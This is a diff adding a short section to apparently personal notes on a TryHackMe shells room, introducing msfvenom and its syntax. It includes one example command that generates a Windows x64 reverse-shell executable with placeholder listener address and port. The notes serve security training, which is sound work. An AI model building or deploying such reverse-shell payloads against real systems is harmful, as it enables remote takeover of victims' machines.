@@ -421,4 +421,22 @@ For other common reverse shell payloads, [PayloadsAllTheThings](https://tryhackm
 
 ---
 
-### Task 9: msfvenom
+### Task 9: msfvenom  
+
+Msfvenom: the one-stop-shop for all things payload related.  
+
+Part of the Metasploit framework, msfvenom is used to generate code for primarily reverse and bind shells. It is used extensively in lower-level exploit development to generate hexadecimal shellcode when developing something like a Buffer Overflow exploit; however, it can also be used to generate payloads in various formats (e.g. .exe, .aspx, .war, .py). It's this latter function that we will be making use of in this room. There is more to teach about msfvenom than could ever be fit into a single room, let alone a single task, so the following information will be a brief introduction to the concepts that will prove useful for this room.  
+
+The standard syntax for msfvenom is as follows:  
+
+msfvenom -p <PAYLOAD> <OPTIONS>  
+
+For example, to generate a Windows x64 Reverse Shell in an exe format, we could use:  
+
+msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>  
+
+<img width="852" height="124" alt="image" src="https://github.com/user-attachments/assets/034dbbbd-4df7-4a90-8d4e-4022b7a81d93" />
+
+
+
+
